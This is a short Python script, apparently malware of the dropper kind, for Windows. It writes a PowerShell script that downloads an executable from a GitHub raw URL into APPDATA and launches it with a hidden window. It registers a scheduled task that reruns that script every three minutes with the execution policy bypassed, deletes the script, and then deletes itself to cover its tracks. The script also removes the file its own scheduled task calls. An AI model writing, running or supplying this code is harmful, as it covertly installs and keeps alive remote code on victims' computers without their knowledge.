import os
import subprocess
import time
import sys

# Direct download link for the executable
executable_url = "https://raw.githubusercontent.com/davidkennedy02/gaslight/main/dist/hmm.exe"

# Step 1: Define the PowerShell command to download and execute the payload
powershell_command = f'''
$URL = "{executable_url}";
$Output = "$env:APPDATA\\hmm.exe";
Invoke-WebRequest -Uri $URL -OutFile $Output;
Start-Process -FilePath "$Output" -WindowStyle Hidden;
'''

# Step 2: Save the PowerShell command to a temporary file in the user's AppData folder
temp_ps_path = os.path.join(os.environ["APPDATA"], "inject.ps1")
with open(temp_ps_path, "w") as ps_file:
    ps_file.write(powershell_command)

# Step 3: Create a scheduled task that runs the PowerShell script every 3 minutes under the current user
task_name = "somethingreallyunique"
create_task_command = f"""
schtasks /create /tn "{task_name}" /tr "powershell.exe -ExecutionPolicy Bypass -File {temp_ps_path}" /sc minute /mo 3 /f
"""

# Execute the scheduled task creation command
subprocess.run(create_task_command, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

# Step 4: Clean up by deleting the PowerShell script
if os.path.exists(temp_ps_path):
    os.remove(temp_ps_path)

# Step 5: Self-delete with a delay
current_script_path = os.path.realpath(__file__)
time.sleep(2)  # Prevent locked file errors
subprocess.Popen(f'cmd.exe /c del "{current_script_path}"', shell=True)
sys.exit()
